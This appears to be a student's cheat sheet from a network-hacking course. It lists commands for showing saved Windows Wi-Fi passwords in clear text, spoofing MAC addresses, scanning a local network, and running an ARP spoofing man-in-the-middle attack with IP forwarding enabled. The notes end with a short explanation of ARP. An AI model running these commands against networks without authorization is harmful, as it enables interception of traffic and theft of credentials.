WINDOWS
# wifi passwords saved 

netsh wlan show profile
netsh wlan show profile Nome_da_rede key=clear


KALI LINUX VM
# ip configuration
ifconfig

#connect adaptor 
first disconect nat and then connect adapter wifi

#forcing mac address changer
ifconfig eth0 down
ifconfig eth0 hw ether 00:11:22:33:44:55
ifconfig eth0 up
ifconfig

#random mac address changer
sudo python3 mac_changer.py

# network discover
## netdiscover
sudo netdiscover -r 192.168.1.1/24
## Python Script
sudo python3 network_scanner.py -t "192.168.1.1/24"
## nmap
sudo nmap --osscan-guess "192.168.1.1/24" 

# ARP SPOOF
## arpsoof
arpspoof -i eth0 -t 192.168.1.221 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.221
## python script
sudo python3 arp_spoof.py -t 192.168.1.109 -r 192.168.1.1

# liberate packages
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP
## ARP REQUEST
Broadcast MacAddress 
Who are mac Address x
## ARP RECEIVE
My Mac Address is x
## see MY ARP TABLE
arp -a 
## ARP RESPONSE




